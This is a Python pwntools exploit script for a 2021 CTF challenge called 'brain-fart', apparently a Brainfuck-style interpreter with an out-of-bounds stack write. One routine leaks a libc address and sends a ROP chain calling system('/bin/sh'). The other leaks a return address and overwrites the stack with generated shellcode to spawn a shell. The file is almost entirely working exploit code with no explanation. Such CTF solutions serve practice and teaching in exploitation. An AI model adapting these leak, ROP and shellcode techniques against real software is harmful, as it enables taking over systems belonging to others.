from pwn import *

#p = remote("ctf2021.hackpack.club", 10997)
p = process("./brain-fart",env = {"LD_PRELOAD" : "./libc-2.28.so"})
#p = process("./brain-fart")
'''
data = open("/proc/%d/maps"%p.pid,"r").readlines()
print("".join(data))
'''


'''
+  buf[pc]++
-  buf[pc]--
,  buf[pc] = stdin
.  puts(buf[pc])
<  pc-- (not be 0)
>  pc++

data = rbp-1010h
'''
def exp_way_1():
	p.sendlineafter("program:",str(0x2000))
	payload = ">"*0x1018 + ">"*32
	payload += ".>"*8  #leak
	payload += "<"*8*5
	payload += ",>"*8*8
	payload = payload.ljust(0x2000,">")

	#gdb.attach(p)
	p.sendafter("text",payload)
	p.recvuntil('\n')
	data = p.recv(8)
	__libc_start_main_ret = u64(data)
	libc_base = __libc_start_main_ret - libc.sym['__libc_start_main'] - 235
	#print(hex(__libc_start_main_ret))


	print("libc_base : " + hex(libc_base))

	pop_rdi_ret = 0x0000000000401653
	pop_rsi_pop_r15_ret = 0x0000000000401651
	pop_rdx_ret = libc_base + 0x0000000000001b9a#0x00000000001290c6#0x0000000000106725
	system = libc_base + libc.sym['system']
	binsh = libc_base + next(libc.search(b'/bin/sh'))
	execve = libc_base + libc.sym['execve']

	rop = p64(pop_rdi_ret)
	rop += p64(binsh)
	rop += p64(pop_rsi_pop_r15_ret)
	rop += p64(0)
	rop += p64(0)
	rop += p64(system)
	rop += p64(system)
	p.send(rop)


	p.interactive()

def write_8_byte(addr,old):
	payload = ""
	for i in range(8):
		tmp1 = addr >> i*8
		tmp2 = old >> i*8
		byte1 = (tmp1 & 0xff) - (tmp2 & 0xff)
		#print(" byte1 : %x" %byte1)
		if byte1 > 0:
			payload += "+"*byte1
		elif byte1 < 0:
			payload += "-"* (-byte1)
		payload += ">"		
	return payload

def exp_way_2():
	payload = ">"*0x1010
	payload += ".>"*8  #leak
	#1597 15a6
	payload += "+"*0xf
	payload += ".>"*8*8  #leak
	payload += "<"*(0x1018+8*8)

	p.sendlineafter("program:",str(len(payload)))

	#gdb.attach(p)
	p.sendafter("text",payload)
	p.recvuntil('\n')
	data = p.recv(8)
	leak = p.recv(64)[8:]
	shellcode_addr = u64(data) - 0x10 # ret to main
	print(hex(u64(data)))
	print(hex(shellcode_addr))
	shellcode = asm(shellcraft.amd64.sh(),arch = 'amd64')
	shellcode = shellcode.ljust(8*7,b'\x90')
	#raw_input()
	print("shellcode len : " ,len(shellcode))
	print(hexdump(leak))


	#turn 2
	payload = ">"*0x1018
	payload += write_8_byte(shellcode_addr,0x401597)
	for i in range(7):
		addr = shellcode[i*8:(i+1)*8]
		old = leak[i*8:(i+1)*8]
		payload += write_8_byte(u64(addr),u64(old))
	p.sendlineafter("program:",str(len(payload)))
	p.sendafter("text",payload)
	
	p.interactive()
	


exp_way_2()